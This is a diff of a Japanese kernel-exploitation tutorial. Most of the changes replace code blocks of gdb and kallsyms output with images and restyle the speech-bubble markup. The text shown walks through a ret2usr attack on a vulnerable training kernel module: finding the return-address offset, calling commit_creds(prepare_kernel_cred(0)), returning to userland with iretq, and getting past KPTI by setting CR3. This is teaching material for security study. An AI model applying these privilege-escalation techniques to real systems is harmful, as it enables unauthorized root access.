@@ -183,39 +183,33 @@ static void escalate_privilege() {
 これらの処理は簡単なKernel Exploitでは頻出なので、各自自分に合ったコードでテンプレートとして持っておきましょう。`main`関数の先頭にでも`save_state`を呼ぶ処理を追加しておきましょう。
 
 `escalate_privilege`関数内で`prepare_kernel_cred`と`commit_creds`という関数ポインタが必要になりますが、今回KASLRが無効なのでこの値は固定のはずです。実際にこれらの関数のアドレスを取得し、コード中に書いておきましょう。
-```
-/ # grep prepare_kernel_cred /proc/kallsyms 
-ffffffff8106e240 T prepare_kernel_cred
-/ # grep commit_creds /proc/kallsyms 
-ffffffff8106e390 T commit_creds
-```
+
+<center>
+  <img src="img/check_kallsyms.png" alt="/proc/kallsymsからアドレスを取得" style="width:380px;">
+</center>
 
 さて、あとは脆弱性を使って`escalate_privilege`関数を呼べば終わりです。適当に`escalate_privilege`のポインタを大量に書き込んでも良いですが、後々ROPをすることになるので、リターンアドレスの正確なオフセットを把握しておきましょう。
 オフセットはカーネルモジュールをIDAなどで読んで計算しても良いですが、せっかくなのでgdbを使って脆弱性が発火する部分を確認しましょう。
 
 `module_write`中で`_copy_from_user`を呼んでいる箇所をIDAなどで見ると、アドレスは0x190です。`/proc/modules`から得たベースアドレスと足してブレークポイントを付けた状態でwriteを呼んでみます。
 書き込み先のRDIから0x400先は次のようになっています。
-```
-pwndbg> x/8xg 0xffffc90000413aa8 + 0x400
-0xffffc90000413ea8:     0xffffc90000413ee8      0xffffffff8113d4d2
-0xffffc90000413eb8:     0xffffffff8114cd87      0xffff888003149600
-0xffffc90000413ec8:     0xffff888003149600      0x00007ffe564e04d0
-0xffffc90000413ed8:     0x0000000000000420      0x0000000000000000
-```
-さらにretまで進めると、
-```
-pwndbg> x/8xg 0xffffc90000413ea8
-0xffffc90000413ea8:     0x4141414141414141      0x4141414141414141
-0xffffc90000413eb8:     0x4141414141414141      0x4141414141414141
-0xffffc90000413ec8:     0xffff888003149600      0x00007ffe564e04d0
-0xffffc90000413ed8:     0x0000000000000420      0x0000000000000000
-```
-となっており、RSPは0xffffc90000413eb0を指しています。
-```
- ► 0xffffffffc000020e    ret    <0x4141414141414141>
 
-*RSP  0xffffc90000413eb0 ◂— 'AAAAAAAAAAAAAAAAAAAAAAAA'
-```
+<center>
+  <img src="img/gdb_debug_copy.png" alt="_copy_from_userでの書き込み先" style="width:580px;">
+</center>
+
+さらにretまで進めると、
+
+<center>
+  <img src="img/gdb_debug_ret.png" alt="module_write終了時の様子" style="width:580px;">
+</center>
+
+となっており、RSPは0xffffc90000413eb0を指しています。
+
+<center>
+  <img src="img/gdb_debug_ret_regs.png" alt="module_write終了時のレジスタの様子" style="width:480px;">
+</center>
+
 したがって、0x408バイトだけゴミデータを入れた後からRIPを制御できそうです。
 ということで、次のようにexploitを変更してみました。
 ```c
@@ -227,43 +221,30 @@ pwndbg> x/8xg 0xffffc90000413ea8
 最終的なexploitは[ここ](exploit/ret2usr.c)に置いておきます。
 
 `module_write`のret命令で止めてみると、`escalate_privilege`に到達していることが分かります。
-```
- ► 0xffffffffc000020e    ret    <0x401226>
-    ↓
-   0x401226              endbr64 
-   0x40122a              push   rbp
-   0x40122b              mov    rbp, rsp
-   0x40122e              sub    rsp, 0x10
-   0x401232              mov    rax, qword ptr [rip + 0x402f]
-   0x401239              mov    qword ptr [rbp - 0x10], rax
-   0x40123d              mov    rax, qword ptr [rip + 0x402c]
-   0x401244              mov    qword ptr [rbp - 8], rax
-   0x401248              mov    rax, qword ptr [rbp - 0x10]
-   0x40124c              mov    edi, 0
-```
 
-<div class="balloon">
-  <div class="balloon-image-left">
-    牛さん
-  </div>
-  <div class="balloon-text-right">
+<center>
+  <img src="img/gdb_escalate_privilege.png" alt="RIP制御でescalate_privilegeを呼び出し" style="width:520px;">
+</center>
+
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/cow.jpg" alt="牛さん" ></div>
+  <p class="says">
     カーネル空間ではnextiを実行しても、次の命令で止まらないことがあるよ。そういう時はstepiを試してみるか、少し先にブレークポイントを貼ると良いかも？
-  </div>
+  </p>
 </div>
 
 正しくexploitが書けていれば`prepare_kernel_cred`と`commit_creds`を通過します。`restore_state`の中もステップインで見てみましょう。`iretq`を呼ぶ際のスタックは次のようになります。
-```
-pwndbg> x/5xg $rsp
-0xffffc90000413e90:     0x0000000000401139      0x0000000000000033
-0xffffc90000413ea0:     0x0000000000000246      0x00007ffd143837a0
-0xffffc90000413eb0:     0x000000000000002b
-```
+
+<center>
+  <img src="img/gdb_rsp_before_iretq.png" alt="iretq直前のスタックの様子" style="width:580px;">
+</center>
+
 stepiで`win`関数に飛んでいれば成功です。
-```
-/ # ./pwn 
-[+] win!
-/ # 
-```
+
+<center>
+  <img src="img/ret2usr_win.png" alt="win関数の呼び出し成功" style="width:320px;">
+</center>
+
 今はもともとroot権限なので成功したか分かりませんが、とりあえずユーザー空間に戻れています。
 では変更した設定(S99pawnyable)を元に戻し、一般ユーザーからexploitを実行してみましょう。
 
@@ -335,13 +316,11 @@ ROP chainがなぜか動かないけどデバッグするのが面倒な場合�
 ```
 この際**必ずカーネルやユーザーランドでマップされていないアドレスを使う**ようにしましょう。
 
-<div class="balloon">
-  <div class="balloon-image-left">
-    牛さん
-  </div>
-  <div class="balloon-text-right">
+<div class="balloon_l">
+  <div class="faceicon"><img src="../img/cow.jpg" alt="牛さん" ></div>
+  <p class="says">
     おすすめはユーザー空間からもカーネル空間からも通常使われない0xdeadbeefcafebabeだよ。
-  </div>
+  </p>
 </div>
 
 
@@ -358,7 +337,7 @@ KPTI自体はこのような一般的な脆弱性に対する緩和策ではな�
 </center>
 
 ユーザー空間で死んでいるので、`swapgs`からの`iretq`でユーザー空間には戻れているのですが、KPTIの影響でページディレクトリがカーネル空間のままなので、ユーザー空間のページが読めない状態になっています。
-[セキュリティ機構](../introduction/security)の節でも書いたように、ユーザーランドに戻る前にCR3レジスタに0x1000をORしておく必要があります。「そんなgadgetあるのか？」と思うかもしれませんが、この処理はカーネルからユーザー空間に戻る正規の処理に必ず存在しているはずなので、100%見つかります。
+[セキュリティ機構](../introduction/security.html)の節でも書いたように、ユーザーランドに戻る前にCR3レジスタに0x1000をORしておく必要があります。「そんなgadgetあるのか？」と思うかもしれませんが、この処理はカーネルからユーザー空間に戻る正規の処理に必ず存在しているはずなので、100%見つかります。
 具体的には、[`swapgs_restore_regs_and_return_to_usermode`](https://elixir.bootlin.com/linux/v5.10.7/source/arch/x86/entry/entry_64.S#L570)マクロで実装されています。重要なのは以下の部分です。
 ```nasm
 	movq	%rsp, %rdi
